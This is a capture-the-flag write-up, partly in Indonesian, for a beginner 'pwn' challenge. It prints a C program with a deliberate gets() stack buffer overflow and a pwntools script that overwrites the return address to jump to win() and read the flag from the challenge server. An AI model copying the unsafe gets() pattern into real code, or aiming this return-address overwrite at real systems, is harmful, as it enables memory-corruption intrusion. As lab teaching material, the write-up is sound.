# Is pwn really that easy?
> gacoan nya 1 mas
> nc minictf.ucs.or.id 2001

Author: mirai

Solve:

Jadi code Cnya seperti ini:
```
#include <stdio.h>
#include <signal.h>

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void win()
{
    FILE *fp = fopen("/flag.txt", "r");
    char flag[256];
    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fclose(fp);
}

int main()
{
    init();
    char buffer[0x10];
    printf("input something here: ");
    gets(buffer);
    return 0;
}
```

As you can see, this is buffer overflow. What is that?
Buffer overflow is a vulnerability that written to a buffer also corrupts data values in memory addresses adjacent to the destination buffer due to insufficient bounds checking. So when on limits, it getting over and over untul it broke the limits and making
some data get leak. (i hope you can understand from what i'm saying). Lets get back to topic.

I use command `objdump -d ./easy | grep win` and the result `00000000004011d7 <win>:`. As i need it, i use chatgpt to making some exploit command to getting flag. Here the command:
```
from pwn import *

# Konfigurasi
host = "minictf.ucs.or.id"  # host 
port = 2001       # port challenge

# Alamat fungsi win (dari yang kamu kasih: 0x4011d7)
win_addr = 0x4011d7

# Offset buffer overflow (contoh: 0x18 = 24 byte, kalau beda tinggal adjust)
offset = 0x18

# Buat payload
payload = b"A" * offset
payload += p64(win_addr)

# Koneksi ke server
p = remote(host, port)
p.sendline(payload)
p.interactive()
```
So when i try to running it, here the result:

<img width="1402" height="199" alt="image" src="https://github.com/user-attachments/assets/a88d30f8-00f7-4a4d-b5d7-3293741abe3b" />

Then we got the flag~
```
Flag: UCS{kamu tau gak apa yang paling aku cintai dari dia. senyumnya, tawa nya serta karakter nya yang penuh semangat dan selalu membawa keceriaan di mana pun ia berada}
```
